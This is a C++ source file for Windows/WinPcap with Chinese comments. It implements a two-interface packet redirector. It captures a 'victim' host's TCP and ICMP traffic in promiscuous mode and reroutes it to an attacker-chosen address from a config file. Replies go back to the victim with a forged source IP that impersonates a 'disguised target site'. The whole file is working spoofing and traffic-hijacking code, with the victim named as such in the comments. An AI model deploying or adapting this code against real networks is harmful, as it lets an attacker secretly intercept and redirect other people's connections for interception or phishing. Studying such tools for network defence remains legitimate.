// ip_forward_001.cpp : 定义控制台应用程序的入口点。
//By Dexter Ju
//jvdajd@gmail.com
//TCP and ICMP packet redirecting.
//conf.txt
#include "stdafx.h"
#include <winsock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <mstcpip.h>
#include "struct.h"
#include <pcap.h>
#include "ip_address.h"
#include <thread>
#include <string>
#include <iostream>
#include<fstream>
#pragma comment(lib, "Ws2_32.lib")

#define BUFF_SIZE 65535//缓存大小
#define TYPE_IP 0X0800


char errbuf[PCAP_ERRBUF_SIZE];
int int_num = 0;
u_char gateway_mac[6] ;
ip_pkt * ip_header = NULL;
u_int netmask_source;
u_int netmask_destination;
u_int ip_source = NULL;//源端网卡的ip地址
u_int ip_destination = NULL;//目的地网卡的IP地址
u_int ip_victim = NULL;//受害主机的IP
u_int ip_gateway = NULL;//转发网卡的网关IP

const char * packet_filter_s =NULL;
const char * packet_filter_d =NULL;
struct bpf_program fcode_s;//源端过滤器
struct bpf_program fcode_d;//目的地端过滤器

pcap_addr_t *a;
pcap_t * source_winpcap = NULL;//source句柄
pcap_t * destination_winpcap = NULL;//destination句柄
pcap_if_t *alldevs;//用于显示设备列表的指针
pcap_if_t *d;//用于显示设备列表的指针

in_addr destination_in_addr;
u_char source_mac[6] = { NULL };//源端网卡的MAC地址
u_char destination_mac[6] = { NULL };//目的端网卡的MAC地址
u_char from_mac[6] = { NULL };//源端来源的mac地址

const char * target = NULL; //伪装的目标站点
std::string target_s;
std::string redriect_address;
char internet_gateway[15] = { NULL };//因特网网关地址
char ifile_buff[4][100] = { NULL };

u_char source_buff[BUFF_SIZE] = { NULL };//源端缓存
u_char destination_buff[BUFF_SIZE] = { NULL };//目的端缓存
u_long victim_address = { NULL };//受害者IP地址


std::ifstream ifile;

int inum;
int i = 0;

//初始化网关MAC地址




void source_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
void destination_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);

void source_fun(){
	printf("大兽神麦克佐德已经启动了\n");
	pcap_loop(source_winpcap, 0, (pcap_handler)source_handler, NULL);
}
void destination_fun(){
	printf("大兽神麦克佐德2号已经启动了\n");
	pcap_loop(destination_winpcap, 0, (pcap_handler)destination_handler, NULL);
}
void source_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data) //源端的回调函数
{
	//处理从源端发来的TCP包，并负责将其转发至因特网
	et_header *eth_ptr;
	ip_pkt * ip_ptr;
	eth_ptr = (et_header *)pkt_data;
	ip_ptr = (ip_pkt *)(pkt_data+ETH_HEADER);//针对target进行IP筛选
		char * temp = inet_ntoa(ip_ptr->src);
		if (fliter_ip(ip_ptr->src.s_addr,ip_destination))
		{
			//验证是否是本机发出的包，如果IP相等结果为真
			
			return;

		}
#ifndef FIRSTPACKET
#define FIRSTPACKET
		memcpy(from_mac, eth_ptr->eh_src, 6);//记录来源网关的MAC地址
		
#endif


		victim_address = ip_ptr->src.s_addr;//抓取受害者地址
		memcpy(source_buff, pkt_data, header->len);
		eth_ptr = (et_header*)source_buff;
		ip_ptr = (ip_pkt *)(source_buff + ETH_HEADER);//开始填包
		memcpy(eth_ptr->eh_dst, gateway_mac, 6);//填写因特网MAC网关地址
		memcpy(eth_ptr->eh_src, destination_mac, 6);
		eth_ptr->eh_type = htons(TYPE_IP);
		ip_ptr->src.s_addr = ip_destination;//用因特网网卡发送
		const char * redriect_addr = redriect_address.c_str();
		ip_ptr->dst.s_addr = inet_addr(redriect_addr);//目标改为重定向IP
		ip_ptr->cksum = 0;
		ip_ptr->cksum = in_cksum((u_short *)ip_ptr, 20);
		
		switch (ip_ptr->pro)
		{
		case IPPROTO_TCP:

			//填充TCP校验和
			tcp_cksum(source_buff);
			break;
		case IPPROTO_ICMP:
			icmp_cksum(source_buff, header->len);
			break;
		default:
			return;
		}
		if ((pcap_sendpacket(destination_winpcap, (u_char*)source_buff, header->len)) != 0)
		{
			fprintf(stderr, "\nError sending the packet : \n", pcap_geterr(destination_winpcap));
			return;
		}

		memset(source_buff, NULL, header->len);
		printf("源端来的数据包转发成功！长度为：%d\n", header->len);
		return;

}

void destination_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)//目的地端的回调函数
{
	//处理从因特网返回的TCP包，并对其进行处理，返回给源端
	et_header *eth_ptr;
	ip_pkt * ip_ptr;
	eth_ptr = (et_header *)pkt_data;
	ip_ptr = (ip_pkt *)(pkt_data + ETH_HEADER);//针对target进行IP筛选
//确认是由重定向目标返回的包
	
		if (fliter_mac(eth_ptr->eh_src, source_mac))
		{
			//ip已经填写为targetIP，需要用MAC地址进行筛选,防止捕捉到由source发出的伪造包，检测sourcemac是否为本机，如果为本机则丢弃
			return;

		}
		memcpy(destination_buff, pkt_data, header->len);
		eth_ptr = (et_header*)destination_buff;
		ip_ptr = (ip_pkt *)(destination_buff + ETH_HEADER);//开始填包
		memcpy(eth_ptr->eh_dst, from_mac, 6);//填写本地MAC网关地址
		memcpy(eth_ptr->eh_src, source_mac, 6);
		eth_ptr->eh_type = htons(TYPE_IP);
		ip_ptr->src.s_addr = inet_addr(target);//填写目标网站IP
		ip_ptr->dst.s_addr = victim_address;//填写受害者IP
		ip_ptr->cksum = 0;
		ip_ptr->cksum = in_cksum((u_short *)ip_ptr, 20);
		//填充TCP校验和
		switch (ip_ptr->pro)
		{
		case IPPROTO_TCP:

			//填充TCP校验和
			tcp_cksum(destination_buff);
			break;
		case IPPROTO_ICMP:
			
			icmp_cksum(destination_buff, header->len);
			break;
		default:
			return;
		}
		
		if ((pcap_sendpacket(source_winpcap, (u_char*)destination_buff, header->len)) != 0)
		{
			fprintf(stderr, "\nError sending the packet : \n", pcap_geterr(destination_winpcap));
			return;
		}

		memset(destination_buff, NULL, header->len);
		printf("目的地端来的数据包转发成功！长度为：%d\n", header->len);
		return;

}






int _tmain(int argc, _TCHAR* argv[])
{
	//读取配置文件
	ifile.open("c:/conf.txt",std::ios::in);

	std::string config;
	int index = 0;
	while (ifile.getline(ifile_buff[index], 100)){
		index++;
	}
	packet_filter_s = ifile_buff[0];
	packet_filter_d = ifile_buff[1];
	target_s = ifile_buff[2];
	redriect_address = ifile_buff[3];
	
	//进行网络设备的设置
	loadiphlpapi();
	//进行网卡的选择和初始化
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		return -1;
	}


	//打印设备列表
	for (d = alldevs; d; d = d->next)
	{
		ifprint(d, i);
		++i;
	}
	int_num = i;

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}

	printf("Enter the interface number for source (1-%d):", int_num);//选择源端网卡设备
	scanf("%d", &inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		//释放设备列表
		pcap_freealldevs(alldevs);
		return -1;
	}

	//跳转至被选中的设备
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);
	for (a = d->addresses; a; a = a->next) {
		switch (a->addr->sa_family)
		{
		case AF_INET:
			printf("\tAddress Family Name: AF_INET\n");
			if (a->addr)
				ip_source = ((struct sockaddr_in *)a->addr)->sin_addr.s_addr;
			if (a->netmask)
				netmask_source = ((struct sockaddr_in *)a->netmask)->sin_addr.s_addr;
			break;
		default:
			continue;
		}
	}
	if (get_mac_address(d, source_mac))
	{
		printf("获取MAC地址失败！");
		return -1;
	}
	/* Open the adapter */
	if ((source_winpcap = pcap_open_live(d->name,	// name of the device
		65536,			// portion of the packet to capture. 
		// 65536 grants that the whole packet will be captured on all the MACs.
		1,				// promiscuous mode (nonzero means promiscuous)
		10,			// read timeout
		errbuf			// error buffer
		)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}
	//编译过滤器
	if (pcap_compile(source_winpcap, &fcode_s, packet_filter_s, 1, netmask_source) <0)
	{
		fprintf(stderr, "\nUnable to compile the packet filter. Check the syntax.\n");
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	//设置过滤器
	if (pcap_setfilter(source_winpcap, &fcode_s)<0)
	{
		fprintf(stderr, "\nError setting the filter.\n");
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}


	//进行目的地设备的处理
	//destination
	//需要添加获取网关IP和mac地址的功能
	printf("Enter the interface number for destination (1-%d):", int_num);//选择目的地设备
	scanf("%d", &inum);
	if (inum < 1 || inum > int_num)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* Jump to the selected adapter */
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);
		for (a = d->addresses; a; a = a->next) {
			switch (a->addr->sa_family)
			{
			case AF_INET:
				printf("\tAddress Family Name: AF_INET\n");
				if (a->addr)
					destination_in_addr = ((struct sockaddr_in *)a->addr)->sin_addr;
					ip_destination = ((struct sockaddr_in *)a->addr)->sin_addr.s_addr;//获取网卡IP
				if (a->netmask)
					netmask_destination = ((struct sockaddr_in *)a->netmask)->sin_addr.s_addr;//获取子网掩码
				break;
			default:
				continue;
			}
	}
	
	if (get_mac_address(d,destination_mac))
	{
		printf("获取MAC地址失败！");
		return -1;
	}
	/* Open the adapter */
	if ((destination_winpcap = pcap_open_live(d->name,	// name of the device
		65536,			// portion of the packet to capture. 
		// 65536 grants that the whole packet will be captured on all the MACs.
		1,				// promiscuous mode (nonzero means promiscuous)
		10,			// read timeout
		errbuf			// error buffer
		)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}
	//准备获取网关IP和mac地址

	get_gateway(destination_in_addr, internet_gateway);
	printf("获取到的网关地址为%s\n", internet_gateway);
	ip_gateway = inet_addr(internet_gateway);
	get_gateway_mac_address(gateway_mac, ip_gateway);
	printf("获取到网关设备的MAC地址为 %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",
		gateway_mac[0],
		gateway_mac[1],
		gateway_mac[2],
		gateway_mac[3],
		gateway_mac[4],
		gateway_mac[5]);


	if (pcap_compile(destination_winpcap, &fcode_d, packet_filter_d, 1, netmask_destination) <0)
	{
		fprintf(stderr, "\nUnable to compile the packet filter. Check the syntax.\n");
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	//设置过滤器
	if (pcap_setfilter(destination_winpcap, &fcode_d)<0)
	{
		fprintf(stderr, "\nError setting the filter.\n");
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}
	//printf("请输入重定向的目标IP：\n");
	//fflush(stdin);//清空缓冲区
	//std::cin>>redriect_address;
	//fflush(stdin);//清空缓冲区
	//printf("请输入需要伪装的IP地址：\n");
	//std::cin >> target_s;
	target = target_s.c_str();
	std::thread source(source_fun);
	std::thread destination(destination_fun);
	source.join();
	destination.join();


	return 0;
}


